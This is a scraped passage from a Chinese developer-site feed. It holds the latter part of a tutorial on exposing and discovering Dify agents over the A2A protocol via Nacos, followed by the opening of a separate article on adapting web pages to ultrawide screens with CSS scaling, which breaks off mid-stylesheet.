<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fa81a876eba49f8977a625e9f1a06f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=xSfHycH0yS6K30pW2VfragoJe8A%3D" alt="图片" loading="lazy"/></p>
<h4 data-id="heading-20">步骤三：创建 Dify Agent 应用</h4>
<ol>
<li>
<p>在 Dify 中创建一个新的 Agent 应用</p>
</li>
<li>
<p>添加 A2A Discovery 插件的两个工具：</p>
<ul>
<li><code>get_a2a_agent_information</code></li>
<li><code>call_a2a_agent</code></li>
</ul>
</li>
<li>
<p>配置工具参数：</p>
</li>
</ol>

<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">discovery_type:</span> nacos
<span class="hljs-symbol">available_agent_names:</span> translator_agent,search_agent,customer_service_agent
<span class="hljs-symbol">namespace_id:</span> <span class="hljs-keyword">public</span>
</code></pre>
<p>4.  设置系统提示词：</p>

<pre><code class="hljs language-markdown" lang="markdown">你是一个智能客服助手，可以调用多个专业智能体来处理用户请求。
工作流程：
<span class="hljs-bullet">1.</span> 首先调用 get<span class="hljs-emphasis">_a2a_</span>agent<span class="hljs-emphasis">_information 获取所有可用智能体的信息
2. 根据用户的问题类型，选择最合适的智能体
3. 调用 call_</span>a2a<span class="hljs-emphasis">_agent 向选中的智能体发送请求
4. 整合响应结果，为用户提供完整的答案
可用的智能体包括翻译、搜索、客服等，请根据任务特点智能选择。
</span></code></pre>
<h4 data-id="heading-21">步骤四：测试验证</h4>
<p>部署应用后，尝试以下对话：</p>
<p><strong>用户</strong>：请帮我把"How to return the product?"翻译成中文</p>
<p><strong>AI 助手（内部流程）:</strong></p>
<ol>
<li>
<p>调用 <code>get_a2a_agent_information</code> 获取智能体列表</p>
</li>
<li>
<p>识别这是翻译任务，选择 <code>translator_agent</code></p>
</li>
<li>
<p>调用 <code>call_a2a_agent</code> 发送翻译请求</p>
</li>
<li>
<p>返回翻译结果</p>
</li>
</ol>
<p><strong>用户：</strong> 我想查询订单 #12345 的物流状态</p>
<p><strong>AI 助手（内部流程）：</strong></p>
<ol>
<li>
<p>识别这是客服问题，选择 <code>customer_service_agent</code></p>
</li>
<li>
<p>调用智能体获取订单信息</p>
</li>
<li>
<p>返回物流状态</p>
</li>
</ol>
<h3 data-id="heading-22">4.2 使用 A2A Server 暴露 Dify 应用</h3>
<p>现在让我们演示如何使用 A2A Server 插件将 Dify 应用暴露为 A2A 智能体，让其他系统能够发现和调用。</p>
<h4 data-id="heading-23">场景描述</h4>
<p>假设我们已经在 Dify 中构建了一个强大的「智能客服助手」应用，现在希望将其暴露为 A2A 智能体，让：</p>
<ul>
<li>其他 AgentScope 应用可以调用</li>
<li>其他 A2A 生态中的智能体可以发现并协作</li>
<li>外部 AI 应用可以通过标准协议接入</li>
</ul>
<h4 data-id="heading-24">步骤一：安装 A2A Server 插件</h4>
<ol>
<li>在 Dify 插件市场搜索「A2A Server」或直接访问插件页面 <strong>[</strong> <strong>4]</strong> 2. 点击安装插件</li>
</ol>
<h4 data-id="heading-25">步骤二：创建 Endpoint</h4>
<ol>
<li>
<p>进入插件管理页面，找到 A2A Server 插件</p>
</li>
<li>
<p>点击「创建 Endpoint」</p>
</li>
<li>
<p>配置基本参数：</p>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74ef4b05b1854ab0836f6b802ca2cdd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=XC3a3AoxlaujcXMDGLCg4ibb3zE%3D" alt="图片" loading="lazy"/></p>
<ol start="4">
<li>点击保存，Dify 会生成 Endpoint ID</li>
</ol>
<h4 data-id="heading-26">步骤三：更新正确的 URL</h4>
<p>保存后，获取生成的 Endpoint ID（如 abc123），然后：</p>
<ol>
<li>返回编辑 Endpoint2. 将 Agent Public URL 更新为正确的地址：</li>
</ol>

<pre><code class="hljs language-bash" lang="bash"> https://your-domain.com/e/abc123/a2a
</code></pre>
<p>3.  保存配置</p>
<p>最终的 A2A 端点：</p>
<ul>
<li><strong>AgentCard 地址：</strong> <code>https://your-domain.com/e/{endpoint_id}/a2a/.well-known/agent.json</code></li>
<li><strong>JSON-RPC 地址：</strong> <code>https://your-domain.com/e/{endpoint_id}/a2a</code></li>
</ul>
<h4 data-id="heading-27">步骤四：配置 Nacos 注册（可选）</h4>
<p>如果希望智能体能被自动发现，可以配置 Nacos 注册：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30826bc53689426294276471b8a2eb6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=efzgcfyn5kwJ41LojXK6AwXaH6Y%3D" alt="图片" loading="lazy"/></p>
<h4 data-id="heading-28">步骤五：测试验证</h4>
<p><strong>测试 AgentCard 获取</strong></p>
<pre><code class="hljs language-bash" lang="bash">curl https://your-domain.com/e/{endpoint_id}/a2a/.well-known/agent.json
</code></pre>
<p>成功返回示例：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"smart-service-agent"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"智能客服助手，支持订单查询、售后服务、产品咨询"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://your-domain.com/e/abc123/a2a"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"capabilities"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"streaming"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"push_notifications"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"skills"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"dify_app"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"smart-service-agent"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"智能客服助手，支持订单查询、售后服务、产品咨询"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>测试消息发送</strong></p>
<p>使用 A2A SDK 或兼容客户端发送消息：</p>
<pre><code class="hljs language-ini" lang="ini">from a2a.client import A2AClient
<span class="hljs-attr">client</span> = A2AClient(<span class="hljs-string">"https://your-domain.com/e/{endpoint_id}/a2a"</span>)
<span class="hljs-attr">response</span> = client.send_message(<span class="hljs-string">"我想查询订单 #12345 的状态"</span>)
print(response.text)
</code></pre>
<h4 data-id="heading-29">与 AgentScope 集成</h4>
<p>AgentScope 配置完成后，AgentScope 应用可以通过 Nacos 自动发现并调用该 Dify 智能体：</p>
<pre><code class="hljs language-ini" lang="ini">from agentscope.agent import A2AAgent
from agentscope.a2a import NacosAgentCardResolver
from agentscope.message import Msg
<span class="hljs-comment"># Python AgentScope v1.0.11以上</span>
<span class="hljs-comment"># 创建 Nacos AgentCard Resolver</span>
<span class="hljs-attr">nacos_resolver</span> = NacosAgentCardResolver(
    <span class="hljs-attr">remote_agent_name</span>=<span class="hljs-string">"my-remote-agent"</span>,  <span class="hljs-comment"># Nacos 中注册的智能体名称</span>
    <span class="hljs-attr">nacos_client_config</span>=ClientConfig(
        <span class="hljs-attr">server_addresses</span>=<span class="hljs-string">"http://localhost:8848"</span>,  <span class="hljs-comment"># Nacos 服务器地址</span>
        <span class="hljs-comment"># 其他可选配置项</span>
    ),
)
<span class="hljs-comment"># 使用 Resolver 创建 A2AAgent，通过名称从 Nacos 发现 Agent</span>
<span class="hljs-attr">agent</span> = A2AAgent(
    <span class="hljs-attr">agent_card</span>=await nacos_resolver.get_agent_card()
)
</code></pre>
<p>更多集成方式请参考 AgentScope 官方文档。</p>
<h2 data-id="heading-30">Nacos Agent Registry 企业级能力</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/641a9c243b794e65b2fa90dec840431d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=1PrDjIKSKrLCnszxYEqgJMduT5s%3D" alt="Gemini_Generated_Image_qyzu2tqyzu2tqyzu.png" loading="lazy"/></p>
<p><strong>统一注册发现</strong></p>
<p>所有 A2A Agent 集中注册到 Nacos，开发者无需关心智能体的具体部署位置。新增智能体时只需注册到 Nacos，Dify 应用即可自动发现并调用，支持动态上下线。</p>
<p><strong>多租户隔离</strong></p>
<p>基于 Nacos 的命名空间隔离机制，可以将不同环境（开发、测试、生产）或不同业务线的智能体完全隔离，互不影响，满足企业级多租户场景。</p>
<p><strong>健康检查</strong></p>
<p>Nacos 自动监控各智能体的运行状态，当某个 Agent 不可用时自动从服务列表中摘除，避免调用失败，恢复后自动重新上线。</p>
<p><strong>元信息管理</strong></p>
<p>支持在运行时动态更新智能体的描述、技能列表等元信息，无需重启服务。这对于智能体能力迭代升级非常友好。</p>
<p><strong>访问控制</strong></p>
<p>通过 Nacos 的认证鉴权机制，可以精细控制哪些应用可以访问哪些智能体，保障企业级应用的安全性。</p>
<p><strong>生态集成</strong></p>
<p>Nacos Agent Registry 不仅支持 A2A 协议，还与阿里云 AI 网关、AgentScope 等组件无缝对接，构建完整的智能体治理生态。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c888cea429344938b2bcc2da01db1e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891346&amp;x-signature=PNVsGh9d3Cf1XgZr1o8BN7xLZ24%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-31">总结与展望</h2>
<p><strong>A2A 插件组合填补了 Dify 平台在 A2A 协议支持上的空白</strong>，为 Dify 开发者带来了双向多智能体协作能力：</p>
<ul>
<li><strong>双向协议支持：</strong> A2A Discovery 调用外部智能体，A2A Server 暴露 Dify 应用，实现完整的 A2A 生态互通。</li>
<li><strong>简化接入：</strong> 通过 Nacos Agent Registry，一次配置即可发现所有智能体，也可让 Dify 应用被自动发现。</li>
<li><strong>智能选择：</strong> LLM 根据任务需求动态选择最合适的智能体。</li>
<li><strong>标准协议：</strong> 完全遵循 Google A2A 协议，与各类实现无缝兼容。</li>
<li><strong>生态互通：</strong> 与 AgentScope 等主流智能体框架深度集成，Dify 应用可被其他 AI 平台发现和调用。</li>
<li><strong>企业级治理：</strong> 依托 Nacos 平台，享受完整的智能体管理能力。</li>
</ul>
<p>随着 AI 多智能体技术的持续演进，Nacos 将继续深耕 AI Agent 生态，从 MCP Server 管理到 A2A Agent 协作，与 AgentScope 等主流智能体框架深度集成，为开发者提供更加完善的智能体治理平台。通过 A2A Discovery 和 A2A Server 插件的组合，Dify 开发者现在可以构建真正开放互联的智能体应用——既能调用生态中的各类专业智能体，也能将自己的智能体能力开放给整个 A2A 生态。未来，我们还将支持更多的智能体协议和更丰富的治理能力，助力开发者构建更加强大的 AI 应用。</p>
<p><strong>相关链接：</strong></p>
<p>[1] AgentScope</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelscope%2Fagentscope" target="_blank" title="https://github.com/modelscope/agentscope" ref="nofollow noopener noreferrer">github.com/modelscope/…</a></p>
<p>[2] AgentScope 官方文档</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelscope%2Fagentscope" target="_blank" title="https://github.com/modelscope/agentscope" ref="nofollow noopener noreferrer">github.com/modelscope/…</a></p>
<p>[3] 插件页面</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_discovery%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_discovery?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nac…</a></p>
<p>[4] 插件页面</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fa2a_server%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/a2a_server?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nac…</a></p>
<p><strong>参考链接：</strong></p>
<p>[1] A2A 插件源代码（GitHub）</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnacos-group%2Fnacos-dify-plugins" target="_blank" title="https://github.com/nacos-group/nacos-dify-plugins" ref="nofollow noopener noreferrer">github.com/nacos-group…</a></p>
<p>[2] Nacos 官网</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fnacos.io%2F" target="_blank" title="https://nacos.io/" ref="nofollow noopener noreferrer">nacos.io/</a></p>
<p>[3] Nacos GitHub 仓库</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos" target="_blank" title="https://github.com/alibaba/nacos" ref="nofollow noopener noreferrer">github.com/alibaba/nac…</a></p>
<p>[4] Google A2A 协议</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle%2FA2A" target="_blank" title="https://github.com/google/A2A" ref="nofollow noopener noreferrer">github.com/google/A2A</a></p>
<p>[5] Dify 官网</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdify.ai%2F" target="_blank" title="https://dify.ai/" ref="nofollow noopener noreferrer">dify.ai/</a></p>
<p>[6] Nacos MCP 插件</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.dify.ai%2Fplugins%2Fnacos%2Fnacos_mcp%3Flanguage%3Dzh-Hans" target="_blank" title="https://marketplace.dify.ai/plugins/nacos/nacos_mcp?language=zh-Hans" ref="nofollow noopener noreferrer">marketplace.dify.ai/plugins/nac…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[带鱼屏适配，我用了最笨的办法]]></title>    <link>https://juejin.cn/post/7603054272158924850</link>    <guid>https://juejin.cn/post/7603054272158924850</guid>    <pubDate>2026-02-05T10:12:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158924850" data-draft-id="7603054272158662706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="带鱼屏适配，我用了最笨的办法"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T10:12:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="webxin666"/> <meta itemprop="url" content="https://juejin.cn/user/2573323143485608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            带鱼屏适配，我用了最笨的办法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2573323143485608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    webxin666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:12:52.000Z" title="Thu Feb 05 2026 10:12:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>要把官网适配带鱼屏。说实话一开始挺头疼的，21:9 的屏幕和常规 16:9 差太多了，设计那边给的稿子是 2500×1080，核心内容还是 1920×1080。</p>
<p>网上搜了一圈，方案五花八门，什么媒体查询断点、rem 适配、vw/vh 方案... 试了几个都不太顺手。最后用了个最笨的办法 —— 整体 scale 缩放。经过实践效果还不错。</p>
<p><code>超宽屏幕 2900×1080 分辨率的显示效果：页面居中两边留白</code> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc462bf505f4993a59525032a9fcad5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2VieGluNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891174&amp;x-signature=Wxl5gEb%2F1m27y%2BjnWZViwcSpWE8%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p><code>常规屏幕 1920×1080 分辨率的显示效果：只显示核心内容</code> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6d6abf96a8d4ee8a16d4027441d3c8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2VieGluNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891174&amp;x-signature=GxrkOX6lwTy0vxV33LeD3Skul2k%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p><code>较窄屏幕 900×1080 分辨率的显示效果：显示核心内容，上下留白</code> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7245f6932424ff7a524dfec2025925d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2VieGluNjY2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891174&amp;x-signature=ksduuFb%2B4%2ByibuDIXMoaOUp%2Bhsc%3D" alt="image.png" width="70%" loading="lazy"/></p>
<p>实际效果参考<code>莉莉丝游戏</code>的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fpm.lilith.com%2F" target="_blank" title="https://pm.lilith.com/" ref="nofollow noopener noreferrer"><code>《帕萌战斗日记》</code>官网</a></p>
<h2 data-id="heading-0">先说思路</h2>
<p>两层容器嵌套：</p>
<ul>
<li>外层 2500×1080，带鱼屏用户能看到的扩展区域</li>
<li>内层 1920×1080，核心内容区，普通屏幕也能完整显示</li>
</ul>
<p>然后根据视口大小，算一个缩放比例，整体 scale。就这么简单。</p>
<h2 data-id="heading-1">核心就一行 CSS</h2>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attr">--s</span>: <span class="hljs-built_in">min</span>(<span class="hljs-number">100vw</span> / <span class="hljs-number">1920px</span>, <span class="hljs-number">100vh</span> / <span class="hljs-number">1080px</span>);
</code></pre>
<p>取宽高缩放比的最小值，保证页面不会超出屏幕边界。</p>
<p>这里用了 CSS 的 <code>min()</code> 函数，直接在样式里算。省得写 JS 监听 resize 了。</p>
<h2 data-id="heading-2">容器结构</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-id">#element_pc</span> (撑满视口，<span class="hljs-attribute">overflow</span>: hidden)
  └── <span class="hljs-selector-id">#container_2500</span> (<span class="hljs-number">2500</span>×<span class="hljs-number">1080</span>，加 scale 缩放)
        └── <span class="hljs-selector-class">.box_1920</span> (<span class="hljs-number">1920</span>×<span class="hljs-number">1080</span>，居中放核心内容)
</code></pre>
<h2 data-id="heading-3">具体代码</h2>
<h3 data-id="heading-4">HTML 结构</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"element_pc"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"container_2500"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper MySwiper"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 顶部导航，fixed 定位 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Swiper 垂直轮播 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper-wrapper"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper-slide section1"</span>&gt;</span>
                <span class="hljs-comment">&lt;!-- 2500 区域可以放带鱼屏专属的装饰元素 --&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box_1920"</span>&gt;</span>
                    <span class="hljs-comment">&lt;!-- 1920 区域放主要内容 --&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"swiper-slide section2"</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">CSS 核心部分</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-id">#element_pc</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">overflow</span>: hidden;
  
  <span class="hljs-comment">/* 设计稿尺寸，改这俩变量就行 */</span>
  <span class="hljs-attr">--designW</span>: <span class="hljs-number">1920px</span>;
  <span class="hljs-attr">--designH</span>: <span class="hljs-number">1080px</span>;
  <span class="hljs-attr">--s</span>: <span class="hljs-built_in">min</span>(<span class="hljs-number">100vw</span> / <span class="hljs-built_in">var</span>(--designW), <span class="hljs-number">100vh</span> / <span class="hljs-built_in">var</span>(--designH));
}

<span class="hljs-selector-id">#container_2500</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">2500px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">1080px</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-comment">/* 先居中，再缩放 */</span>
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>) <span class="hljs-built_in">scale</span>(<span class="hljs-built_in">var</span>(--s));
